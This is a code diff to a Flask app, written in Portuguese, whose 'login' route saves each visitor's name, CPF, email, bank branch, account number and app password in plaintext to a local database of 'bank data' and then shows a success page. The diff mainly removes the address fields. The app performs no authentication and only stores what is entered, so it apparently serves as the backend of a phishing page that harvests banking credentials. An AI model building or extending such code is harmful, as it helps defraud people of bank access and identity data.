@@ -11,7 +11,6 @@ def init_db():
         CREATE TABLE IF NOT EXISTS usuarios (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             nome TEXT, cpf TEXT, email TEXT,
-            cep TEXT, rua TEXT,
             agencia TEXT, conta TEXT, senha_app TEXT
         )
     ''')
@@ -27,21 +26,18 @@ def login():
     nome = request.form.get('nome')
     cpf = request.form.get('cpf')
     email = request.form.get('email')
-    cep = request.form.get('cep')
-    rua = request.form.get('rua')
     agencia = request.form.get('agencia')
     conta = request.form.get('conta')
-    senha_app = request.form.get('senha_app')
+    senha = request.form.get('senha_app')
 
     conn = sqlite3.connect('dados_bancarios.db')
     cursor = conn.cursor()
-    cursor.execute('''
-        INSERT INTO usuarios (nome, cpf, email, cep, rua, agencia, conta, senha_app)
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-    ''', (nome, cpf, email, cep, rua, agencia, conta, senha_app))
+    cursor.execute('''INSERT INTO usuarios (nome, cpf, email, agencia, conta, senha_app) 
+                      VALUES (?, ?, ?, ?, ?, ?)''', (nome, cpf, email, agencia, conta, senha))
     conn.commit()
     conn.close()
     
+    # Redireciona para a página de sucesso
     return redirect(url_for('sucesso'))
 
 @app.route('/sucesso')
@@ -61,3 +57,4 @@ if __name__ == '__main__':
     init_db()
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
+
